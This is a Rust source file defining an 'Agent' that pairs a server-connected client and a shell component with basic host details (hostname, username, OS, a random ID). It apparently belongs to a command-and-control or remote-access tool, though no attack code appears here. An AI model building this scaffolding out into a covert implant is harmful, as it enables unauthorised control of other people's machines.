use std::{net::SocketAddr, os};

use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::{client::Client, shell::Shell};

pub struct Agent {
    pub client: Client,
    pub info: AgentInfo,
    pub shell: Shell,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentInfo {
    pub agent_id: Uuid,
    pub hostname: String,
    pub username: String,
    pub os: String,
}

impl Agent {
    pub fn new(server_addr: SocketAddr) -> Self {
        Self {
            client: Client::new(server_addr),
            info: AgentInfo::new(),
            shell: Shell::new(),
        }
    }
}

impl AgentInfo {
    pub fn new() -> Self {
        let os = std::env::consts::OS.to_string();
        Self {
            agent_id: Uuid::new_v4(),
            hostname: whoami::fallible::hostname().unwrap(),
            username: whoami::username(),
            os,
        }
    }
}
